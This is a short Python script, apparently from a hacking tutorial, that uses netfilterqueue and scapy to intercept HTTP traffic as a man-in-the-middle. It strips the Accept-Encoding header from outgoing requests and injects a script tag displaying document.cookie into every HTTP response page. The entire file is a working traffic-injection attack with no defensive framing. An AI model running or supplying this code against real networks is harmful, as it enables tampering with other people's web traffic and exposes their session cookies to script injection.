#!/usr/bin/ebv python

import netfilterqueue
import scapy.all as scapy
import re
ack_list =[]

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        #print(scapy_packet.show())
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] request type  HTTP ")
            modify_packet= re.sub("Accept-Encoding:.*?\\r\\n","",scapy_packet[scapy.Raw].load)
            scapy_packet[scapy.Raw].load=modify_packet
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.TCP].chksum
            #print(scapy_packet.show())
            packet.set_payload(str(scapy_packet))
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] response type HTTP ")
            modify_packet = re.sub("<body ", "<script>alert('hacked!!! '+document.cookie);</script> <body", scapy_packet[scapy.Raw].load)
            print(modify_packet)
            scapy_packet[scapy.Raw].load = modify_packet
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.TCP].chksum
            packet.set_payload(str(scapy_packet))
            #print(scapy_packet.show())
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()